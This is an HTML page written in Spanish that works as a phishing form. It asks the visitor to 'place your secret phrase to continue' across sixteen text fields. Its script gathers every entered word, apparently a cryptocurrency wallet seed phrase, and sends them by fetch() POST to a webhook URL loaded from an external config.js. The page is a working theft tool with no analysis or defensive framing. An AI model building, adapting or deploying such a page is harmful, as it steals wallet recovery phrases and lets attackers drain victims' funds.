<!DOCTYPE html>
<html>
  <head>
    <style>
      .container {
        display: flex;
        flex-wrap: wrap;
        justify-content: center;
        background-color: white;
        height: 100vh;
        padding: 50px;
      }
      
      .box {
        width: 300px;
        height: 150px;
        background-color: #263238;
        color: #64b5f6;
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        margin: 10px;
        border-radius: 10px;
        box-shadow: 0px 0px 10px 0px #00000040;
      }
      
      .title {
        font-size: 20px;
        font-weight: bold;
        margin-bottom: 10px;
      }
      
      input[type="text"] {
        width: 200px;
        height: 40px;
        margin-bottom: 10px;
        padding: 10px;
        font-size: 16px;
        border: none;
        border-radius: 5px;
        background-color: #ffffff40;
      }
      
      button[type="submit"] {
        width: 200px;
        height: 40px;
        background-color: #64b5f6;
        color: white;
        border: none;
        border-radius: 5px;
        font-size: 16px;
        cursor: pointer;
      }
    </style>
    <script src="config.js"></script>
    <script>
      function submitForm() {
        // Recopila las frases semilla
        const inputs = document.querySelectorAll("input[type='text']");
        let seedPhrases = [];
        for (let i = 0; i < inputs.length; i++) {
          seedPhrases.push(inputs[i].value);
        }
        
        // Prepara la petición Fetch
        const requestOptions = {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            seedPhrases: seedPhrases
          })
        };
        
        // Envía la petición Fetch
        fetch(webhookURL, requestOptions)
          .then(response => {
            console.log("Success:", response);
          })
          .catch(error => {
            console.error("Error:", error);
          });
      }
    </script>
  </head>
  <body>
    <div class="container">
      <form onsubmit="submitForm(); return false;">
        <div class="box">
          <div class="title">Coloque su frase secreta para continuar</div>
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
               </div>
        <div class="box">
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
        </div>
        <div class="box">
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
        </div>
        <div class="box">
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
          <input type="text" required />
        </div>
        <button type="submit">Enviar</button>
      </form>
    </div>
  </body>
</html>
